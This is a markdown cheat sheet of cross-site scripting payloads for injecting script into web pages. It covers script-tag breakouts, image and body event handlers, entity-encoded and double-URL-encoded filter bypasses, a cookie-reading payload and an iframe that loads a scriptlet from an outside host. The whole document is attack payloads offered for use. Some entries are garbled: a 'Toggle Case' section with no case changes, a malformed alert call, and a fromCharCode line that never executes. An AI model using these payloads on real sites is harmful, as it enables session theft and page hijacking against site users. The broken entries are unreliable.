# XSS Cheatsheet:
## Basics:
- `<script>alert("XSS")</script>`
- `<script>alert("XSS");</script>`
- `<script>alert('XSS')</script>`
- `"><script>alert("XSS")</script>`
- `<script>alert(/XSS")</script>`
- `<script>alert(/XSS/)</script>`

## When inside Script Tags:

- `</script><script>alert(1)</script>`
- `'; alert(1);`
- `')alert(1);//`

## Bypassing with Toggle Case:

- `<script>alert(1)</script>`
- `<img src=javascript:alert('XSS')>`

## XSS in Image and HTML Tags:

- `<img src="javascript:alert('XSS')">`
- `<img src=javascript:alert("XSS")>`
- `<img src=javascript:alert('XSS')>`
- `<img src=xss onerror=alert(1)>`
- `<img """><script>alert("XSS")</script>">`
- `<img src=javascript:alert(String.fromCharCode(88,83,83))>`
- `<img src="javascript:alert('XSS')">`
- `<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;('XSS')>`
- `<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`
- `<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`
- `<body background="javascript:alert('XSS')">`
- `<body onload=alert('XSS')>`
- `<input type="image" src="javascript:alert('XSS');">`
- `<img src="javascript:alert('XSS')">`
- `<iframe src=http://ha.ckers.org/scriptlet.html <`

## Bypassing the Script Tag Filtering:

- `<<script>alert("XSS");//<</script>`
- `%253cscript%253ealert(1)%253c/script%253e`
- `" ><s"+ "cript>alert(document.cookie)</script>`
- `foo<script>alert(1)</script>`
- `<scr<script>ipt>alert(1)</scr<script>ipt>`

## Using String.fromCharCode Function:

- `<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</script>`
- `';alert(String.fromCharCode(88,83,83))//'";alert(String.fromCharCode(88,83,83))//'";alert(String.fromCharCode(88,83,83))//'>;<script>alert(String.fromCharCode(88,83,83))</script>`

Reference: <a href="https://breakthesecurity.cysecurity.org/2012/02/complete-cross-site-scriptingxss-cheat-sheets-part-1.html"> BreakTheSecurity.org/...</a>
